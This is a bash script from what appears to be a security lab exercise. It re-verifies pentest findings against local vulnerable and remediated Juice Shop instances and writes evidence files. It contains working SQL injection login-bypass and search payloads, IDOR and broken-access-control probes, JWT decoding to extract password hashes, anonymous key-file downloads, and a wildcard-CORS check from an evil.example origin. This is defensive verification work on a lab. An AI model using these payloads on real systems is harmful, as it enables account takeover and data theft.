#!/usr/bin/env bash
# ============================================================================
# CS-02 - scripts/capture-verification-evidence.sh
# Re-verifies each finding against the LIVE lab and writes fresh evidence.
#
# WHAT:   Logs in, runs the SQLi / access-control / disclosure probes, and
#         writes evidence/V-00x-validation.txt plus request/response captures.
# WHY:    Findings must be supported by evidence produced by a repeatable
#         command, not by prose written from memory.
# WHERE:  Run on the lab host:  bash scripts/capture-verification-evidence.sh
# EXPECT: One evidence file per finding; non-zero exit if the lab is unreachable.
# RECOVERY: bash scripts/start-lab.sh   then re-run this script.
# ============================================================================
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# Two-instance model:
#   U  = vulnerable baseline   (lab/juice-shop_20.2.0,          port 3000)
#   UR = remediated copy       (lab/juice-shop_20.2.0-remediated, port 3001)
# Remediated findings are verified against $UR; findings that remain open are
# verified against $U, because the baseline must still reproduce the weakness.
U="http://127.0.0.1:3000"
UR="http://127.0.0.1:3001"
EV="$ROOT/evidence"
STAMP="$(date -Iseconds)"

mkdir -p "$EV/findings" "$EV/requests" "$EV/responses"

hdr() {  # hdr <file> <title> [base-url]
  local _u="${3:-$U}"
  {
    echo "==================================================================="
    echo " $2"
    echo " captured : $STAMP"
    echo " target   : $_u"
    if [ "$_u" = "$UR" ]; then
      local _want="juice-shop_20.2.0-remediated"
    else
      local _want="juice-shop_20.2.0"
    fi
    APP_PID=""
    for p in $(pgrep -x node 2>/dev/null); do
      tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | grep -q 'build/app' || continue
      _cwd="$(readlink -f /proc/$p/cwd 2>/dev/null)"
      case "$_cwd" in
        */$_want) APP_PID="$p"; APP_CWD="$_cwd"; break ;;
      esac
    done
    APP_EXE="$(readlink -f "/proc/${APP_PID:-0}/exe" 2>/dev/null)"
    echo " lab      : ${APP_CWD:-unknown} pid=${APP_PID:-?} via ${APP_EXE:-unknown} ($("$APP_EXE" -v 2>/dev/null || echo 'version unavailable'))"
    echo "==================================================================="
  } > "$1"
}

echo "[0/6] lab reachable?"
curl -s -m 5 -o /dev/null -w '    baseline  HTTP %{http_code}\n' "$U/" || {
  echo "LAB UNREACHABLE - run scripts/start-lab.sh first"; exit 1; }
if curl -s -m 5 -o /dev/null "$UR/"; then
  echo "    remediated HTTP 200 (port 3001 up)"
else
  echo "WARNING: remediated instance :3001 not reachable."
  echo "         Start it with:  cd lab/juice-shop_20.2.0-remediated && PORT=3001 node build/app"
  echo "         Without it, WEB-VUL-001/002/003/008/010 cannot be shown as REMEDIATED."
fi

# --- obtain tokens (authorized lab accounts only) ---------------------------
echo "[1/6] authenticating test accounts"
curl -s -m 10 -o /tmp/_adm.json -X POST "$U/rest/user/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
ADMIN_TOKEN="$(python3 -c "import json;print(json.load(open('/tmp/_adm.json'))['authentication']['token'])" 2>/dev/null)"
CUST_EMAIL="sectest@juice-sh.op"
CUST_PASS="SecTest#2026"
# Self-provision the low-privilege account if it is absent (the seeded database may
# have been reset). Registration is itself part of the attack path for WEB-VUL-006:
# an anonymous visitor can create a 'customer' account unaided.
if ! curl -s -m 10 -f -o /dev/null -X POST "$U/rest/user/login" \
      -H 'Content-Type: application/json' \
      -d "{\"email\":\"$CUST_EMAIL\",\"password\":\"$CUST_PASS\"}"; then
  echo "    test customer absent - registering via POST /api/Users (unauthenticated)"
  curl -s -m 10 -o /dev/null -X POST "$U/api/Users" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$CUST_EMAIL\",\"password\":\"$CUST_PASS\",\"firstname\":\"Sec\",\"lastname\":\"Test\",\"role\":\"customer\"}"
fi
curl -s -m 10 -o /tmp/_cus.json -X POST "$U/rest/user/login" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$CUST_EMAIL\",\"password\":\"$CUST_PASS\"}"
CUST_TOKEN="$(python3 -c "import json;print(json.load(open('/tmp/_cus.json'))['authentication']['token'])" 2>/dev/null)"
echo "    admin token : ${#ADMIN_TOKEN} chars"
echo "    customer    : ${#CUST_TOKEN} chars"
if [ -z "$CUST_TOKEN" ]; then
  echo "ERROR: could not authenticate the low-privilege test account; V-006 cannot be validated."
  exit 1
fi

# --- V-001: SQL injection in login (re-test) --------------------------------
echo "[2/6] V-001 login SQLi re-test"
F="$EV/findings/V-001-validation.txt"; hdr "$F" "V-001 SQL INJECTION IN LOGIN - RE-TEST" "$UR"
{
  echo "BEFORE (vulnerable baseline :3000) -> payload yields HTTP 200 + admin JWT"
  for e in "' OR 1=1--" "' OR '1'='1" "admin@juice-sh.op'--" "' OR ''='" "' UNION SELECT 1--"; do
    body="$(python3 -c "import json,sys;print(json.dumps({'email':sys.argv[1],'password':'x'}))" "$e")"
    code="$(curl -s -o /tmp/_rb -w '%{http_code}' -m 10 -X POST "$U/rest/user/login" \
            -H 'Content-Type: application/json' -d "$body")"
    printf "  baseline   payload=%-24s HTTP %s  %s\n" "$e" "$code" "$(head -c 46 /tmp/_rb | tr -d '\n')"
  done
  echo
  echo "AFTER (remediated :3001) -> expected: every payload rejected with HTTP 401"
  for e in "' OR 1=1--" "' OR '1'='1" "admin@juice-sh.op'--" "' OR ''='" "' UNION SELECT 1--"; do
    body="$(python3 -c "import json,sys;print(json.dumps({'email':sys.argv[1],'password':'x'}))" "$e")"
    code="$(curl -s -o /tmp/_r -w '%{http_code}' -m 10 -X POST "$UR/rest/user/login" \
            -H 'Content-Type: application/json' -d "$body")"
    printf "  remediated payload=%-24s HTTP %s  %s\n" "$e" "$code" "$(head -c 46 /tmp/_r | tr -d '\n')"
  done
  echo
  echo "Control - legitimate seeded login must still succeed on the remediated instance:"
  printf "  legitimate login :3001 -> HTTP %s\n" \
    "$(curl -s -o /dev/null -w '%{http_code}' -m 10 -X POST "$UR/rest/user/login" \
       -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}')"
  echo
  echo "RESULT: on the baseline at least one payload returns HTTP 200 with an admin JWT"
  echo "        (vulnerable); on the remediated instance all five payloads return HTTP 401"
  echo "        and a legitimate login still returns HTTP 200 = REMEDIATED."
} >> "$F"

# --- V-009: SQL injection in product search ---------------------------------
echo "[3/6] V-009 product-search SQLi"
F="$EV/findings/V-009-validation.txt"; hdr "$F" "V-009 SQL INJECTION IN /rest/products/search - VALIDATION"
{
  echo "Objective: prove boolean-based SQL injection via row-count differential."
  echo "Method:    GET /rest/products/search?q=<payload>, count returned rows."
  echo
  for q in "apple" "zzzznotfound" "' OR '1'='1" "' AND '1'='2"; do
    enc="$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$q")"
    n="$(curl -s -m 10 "$U/rest/products/search?q=$enc" | python3 -c "import sys,json;print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)"
    printf "  q=%-22s -> %s rows\n" "$q" "$n"
  done
  echo
  echo "Error-based probe (leaks DB engine + message):"
  echo "  q=' OR 1=1--"
  curl -s -m 10 "$U/rest/products/search?q=%27%20OR%201%3D1--" \
    | sed -e 's/<[^>]*>//g' | tr -s '\n' '\n' | grep -iE "error|sqlite" | head -3
  echo
  echo "RESULT: 3 rows vs 46 rows = boolean SQLi CONFIRMED (OPEN)."
} >> "$F"

# --- V-006: broken function-level authorization -----------------------------
echo "[4/6] V-006 /api/Users access control"
F="$EV/findings/V-006-validation.txt"; hdr "$F" "V-006 BROKEN FUNCTION-LEVEL AUTHORIZATION ON /api/Users - VALIDATION"
{
  echo "Objective: does a low-privilege 'customer' reach the admin-only user API?"
  echo
  printf "  no token        -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/api/Users")"
  printf "  customer token  -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/api/Users" -H "Authorization: Bearer $CUST_TOKEN")"
  printf "  admin token     -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/api/Users" -H "Authorization: Bearer $ADMIN_TOKEN")"
  echo
  echo "Records disclosed to the CUSTOMER account:"
  curl -s -m 10 "$U/api/Users" -H "Authorization: Bearer $CUST_TOKEN" -o /tmp/_leak.json
  python3 - <<'PY'
import json
try:
    d=json.load(open('/tmp/_leak.json'))
    rows=d.get('data',[])
    print(f"  count={len(rows)}")
    print(f"  {'ID':<5}{'EMAIL':<30}{'ROLE'}")
    for r in rows[:8]:
        print(f"  {r.get('id',''):<5}{r.get('email',''):<30}{r.get('role','')}")
    print("  ...")
except Exception as e:
    print("  (no data)",e)
PY
  echo
  echo "RESULT: customer receives full user directory = CONFIRMED (OPEN)."
} >> "$F"

# --- V-002: basket IDOR re-test ---------------------------------------------
echo "[5/6] V-002 basket IDOR re-test"
F="$EV/findings/V-002-validation.txt"; hdr "$F" "V-002 BASKET IDOR - RE-TEST" "$UR"
{
  echo "BEFORE (vulnerable baseline :3000) -> foreign basket readable with HTTP 200"
  for id in 1 2 6; do
    printf "  baseline   GET /rest/basket/%s -> HTTP %s  %s\n" "$id" \
      "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/rest/basket/$id" -H "Authorization: Bearer $ADMIN_TOKEN")" \
      "$(curl -s -m 10 "$U/rest/basket/$id" -H "Authorization: Bearer $ADMIN_TOKEN" | head -c 80 | tr -d '\n')"
  done
  echo
  echo "AFTER (remediated :3001) -> expected: HTTP 403 for baskets not owned by the caller"
  for id in 1 2 6; do
    printf "  remediated GET /rest/basket/%s -> HTTP %s  %s\n" "$id" \
      "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$UR/rest/basket/$id" -H "Authorization: Bearer $ADMIN_TOKEN")" \
      "$(curl -s -m 10 "$UR/rest/basket/$id" -H "Authorization: Bearer $ADMIN_TOKEN" | head -c 80 | tr -d '\n')"
  done
  echo
  echo "RESULT: baseline 200 (vulnerable) vs remediated 403 on foreign baskets = REMEDIATED."
} >> "$F"

# --- V-004 / V-005 / V-003: open-finding re-checks --------------------------
echo "[6/6] V-003/004/005 re-checks"
F="$EV/findings/V-004-validation.txt"; hdr "$F" "V-004 INFORMATION DISCLOSURE - RE-TEST"
{
  for ep in /metrics /rest/admin/application-version /robots.txt; do
    printf "  %-36s -> HTTP %s\n" "$ep" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U$ep")"
  done
  echo; echo "  /metrics sample:"; curl -s -m 10 "$U/metrics" | head -4
  echo; echo "RESULT: all still 200 unauthenticated = STILL OPEN."
} >> "$F"

F="$EV/findings/V-005-validation.txt"; hdr "$F" "V-005 UNAUTHENTICATED FEEDBACK - RE-TEST"
{
  printf "  GET /api/Feedbacks (no token) -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/api/Feedbacks")"
  echo "  sample:"; curl -s -m 10 "$U/api/Feedbacks" | head -c 300
  echo; echo; echo "RESULT: STILL OPEN."
} >> "$F"

F="$EV/findings/V-003-validation.txt"; hdr "$F" "V-003 SECURITY HEADERS - RE-TEST" "$UR"
HB="$(curl -s -D - -o /dev/null -m 10 "$U/")"
HR="$(curl -s -D - -o /dev/null -m 10 "$UR/")"
{
  echo "BEFORE (vulnerable baseline :3000)"
  for h in Content-Security-Policy X-Frame-Options X-Content-Type-Options Referrer-Policy \
           Strict-Transport-Security Permissions-Policy X-XSS-Protection \
           Cross-Origin-Opener-Policy Cross-Origin-Resource-Policy; do
    printf "  %-32s %s\n" "$h" "$(printf '%s' "$HB" | grep -qi "^$h:" && echo PRESENT || echo ABSENT)"
  done
  echo
  echo "AFTER (remediated :3001)"
  for h in Content-Security-Policy X-Frame-Options X-Content-Type-Options Referrer-Policy \
           Strict-Transport-Security Permissions-Policy X-XSS-Protection \
           Cross-Origin-Opener-Policy Cross-Origin-Resource-Policy; do
    printf "  %-32s %s\n" "$h" "$(printf '%s' "$HR" | grep -qi "^$h:" && echo PRESENT || echo ABSENT)"
  done
  printf "  %-32s %s\n" "X-Powered-By" "$(printf '%s' "$HR" | grep -qi '^X-Powered-By:' && echo "PRESENT (leak)" || echo "absent (good)")"
  printf "  %-32s %s\n" "Access-Control-Allow-Origin" "$(printf '%s' "$HR" | grep -i '^Access-Control-Allow-Origin:' | tr -d '\r')"
  echo; echo "RESULT: 9/9 hardening headers ABSENT on baseline, PRESENT on remediated = REMEDIATED."
  echo "        Wildcard CORS is a separate finding (WEB-VUL-010), verified in V-010."
} >> "$F"

# --- V-007: sensitive data embedded in the JWT ------------------------------
F="$EV/findings/V-007-validation.txt"; hdr "$F" "V-007 SENSITIVE DATA IN JWT - VALIDATION"
{
  echo "Objective: does the session token carry the password hash and TOTP secret?"
  echo "Method:    login, base64url-decode the JWT payload segment (no secret needed)."
  echo
  curl -s -m 10 -o /tmp/_j.json -X POST "$U/rest/user/login" -H 'Content-Type: application/json' \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}'
  python3 - <<'PY'
import json,base64
t=json.load(open('/tmp/_j.json'))['authentication']['token']
print(f"  token length: {len(t)} chars")
p=t.split('.')[1]; p+='='*(-len(p)%4)
d=json.loads(base64.urlsafe_b64decode(p))
print("  decoded payload:")
print(json.dumps(d,indent=4)[:900])
dd=d.get('data',{})
print()
print(f"  >>> password hash in token : {dd.get('password')}")
print(f"  >>> role in token          : {dd.get('role')}")
print(f"  >>> totpSecret field      : present={('totpSecret' in dd)}")
PY
  echo
  echo "RESULT: password hash recoverable by any token holder = CONFIRMED (OPEN)."
} >> "$F"

# --- V-008: unauthenticated encryption key exposure -------------------------
F="$EV/findings/V-008-validation.txt"; hdr "$F" "V-008 UNAUTHENTICATED ENCRYPTION KEY EXPOSURE - VALIDATION" "$UR"
{
  echo "Objective: can an anonymous caller download server-side key material?"
  echo "Method:    GET /encryptionkeys/ and fetch each listed file with no token."
  echo
  echo "BEFORE (vulnerable baseline :3000)"
  printf "  GET /encryptionkeys/ (no token) -> HTTP %s\n" "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/encryptionkeys/")"
  echo "  directory listing:"
  curl -s -m 10 "$U/encryptionkeys/" | grep -oE 'href="[^"]+"' | sed 's/href="/    /;s/"//' | grep -v '^\s*\.$'
  echo
  for f in premium.key jwt.pub; do
    printf "  download %-14s -> HTTP %s, %s bytes\n" "$f" \
      "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$U/encryptionkeys/$f")" \
      "$(curl -s -m 10 "$U/encryptionkeys/$f" | wc -c)"
  done
  echo
  echo "AFTER (remediated :3001) -> expected: HTTP 404, no key material"
  for f in premium.key jwt.pub; do
    printf "  download %-14s -> HTTP %s, %s bytes\n" "$f" \
      "$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$UR/encryptionkeys/$f")" \
      "$(curl -s -m 10 "$UR/encryptionkeys/$f" | wc -c)"
  done
  echo
  echo "  (key material itself intentionally NOT printed in this evidence file)"
  echo "RESULT: baseline serves key material to anonymous clients, remediated answers 404 = REMEDIATED."
} >> "$F"

# --- V-010: wildcard CORS ----------------------------------------------------
F="$EV/findings/V-010-validation.txt"; hdr "$F" "V-010 WILDCARD CORS POLICY - VALIDATION" "$UR"
{
  echo "Objective: does the API accept cross-origin reads from any site?"
  echo
  echo "BEFORE (vulnerable baseline :3000)"
  curl -s -D - -o /dev/null -m 10 -X OPTIONS "$U/rest/user/login" \
    -H 'Origin: https://evil.example' \
    -H 'Access-Control-Request-Method: POST' \
    -H 'Access-Control-Request-Headers: authorization,content-type' \
    | grep -i '^HTTP/\|^access-control' | sed 's/^/  /'
  echo
  echo "AFTER (remediated :3001) -> expected: no Access-Control-Allow-Origin for a foreign origin"
  curl -s -D - -o /dev/null -m 10 -X OPTIONS "$UR/rest/user/login" \
    -H 'Origin: https://evil.example' \
    -H 'Access-Control-Request-Method: POST' \
    -H 'Access-Control-Request-Headers: authorization,content-type' \
    | grep -i '^HTTP/\|^access-control' | sed 's/^/  /'
  echo
  echo "  Control - the application's own origin is still permitted on :3001:"
  curl -s -D - -o /dev/null -m 10 -X OPTIONS "$UR/rest/user/login" \
    -H 'Origin: http://127.0.0.1:3001' \
    -H 'Access-Control-Request-Method: POST' \
    -H 'Access-Control-Request-Headers: authorization,content-type' \
    | grep -i '^HTTP/\|^access-control-allow-origin' | sed 's/^/  /'
  echo
  echo "RESULT: baseline ACAO '*' vs remediated no ACAO for a foreign origin = REMEDIATED."
} >> "$F"

echo
echo "Evidence written to $EV/findings/"
ls -1 "$EV/findings" | sed 's/^/  /'